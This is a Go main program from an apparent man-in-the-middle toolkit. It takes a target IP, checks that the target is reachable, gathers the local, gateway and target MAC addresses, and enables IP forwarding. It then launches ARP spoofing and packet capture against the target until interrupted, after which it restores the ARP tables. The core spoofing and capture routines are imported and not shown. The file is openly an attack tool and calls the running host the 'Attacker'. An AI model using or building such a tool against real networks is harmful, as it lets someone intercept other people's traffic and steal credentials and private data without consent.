package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"mitm-toolkit/arp"
	"mitm-toolkit/capture"
	"mitm-toolkit/network"
)

func main() {
	// Capturing the ip address from the command line
	var targetIP string

	flag.StringVar(&targetIP, "t", "", "target ip address (required)")
	flag.Parse()

	// Validate that ip address was provided
	if targetIP == "" {
		fmt.Println("Error: target IP address is required")
		fmt.Println("Usage: -t <target_ip_address>")
		os.Exit(1)
	}

	// Check if target is reachable
	// send 2 pings and each one with timeout of 2 seconds to the target
	fmt.Printf("Checking if %v is reachable...\n", targetIP)
	cmd := exec.Command("ping", "-c", "2", "-W", "2", targetIP)

	if err := cmd.Run(); err != nil {
		fmt.Printf("Error: Target %s is not reachable or offline\n", targetIP)
		os.Exit(1)
	}

	fmt.Println("Target is reachable!")

	fmt.Printf("Target IP address: %v\n", targetIP)

	// Get local network information
	localNetwork, err := network.GetLocalNetworkInfo()
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("\nAttacker Information:\n")
	fmt.Printf("  Interface: %s\n", localNetwork.InterfaceName)
	fmt.Printf("  IP Address: %s\n", localNetwork.IPv4Address)
	fmt.Printf("  MAC Address: %s\n", localNetwork.MacAddress)

	// Get gateway information
	gatewayIP, err := network.GetNetworkGateway()
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("\nGateway Information:\n")
	fmt.Printf("  Gateway IP: %s\n", gatewayIP)

	// Get target MAC address via ARP
	targetMAC, err := network.GetMACFromIP(targetIP, localNetwork)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("\nTarget MAC Address: %s\n", targetMAC)

	// Get gateway MAC address via ARP
	gatewayMAC, err := network.GetMACFromIP(gatewayIP, localNetwork)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("Gateway MAC Address: %s\n", gatewayMAC)

	if err := arp.EnableIPForwarding(); err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("\nStarting ARP spoofing attack...")
	fmt.Println("Press Ctrl+C to stop and restore ARP tables.")
	fmt.Println() // Empty line before traffic output

	go arp.StartARPSpoofing(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
	go capture.StartCapture(localNetwork, targetIP)

	// Block until ctrl+c signal to exit
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	//Cleanup
	fmt.Println("\nRestoring ARP tables...")
	arp.RestoreARP(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)

}
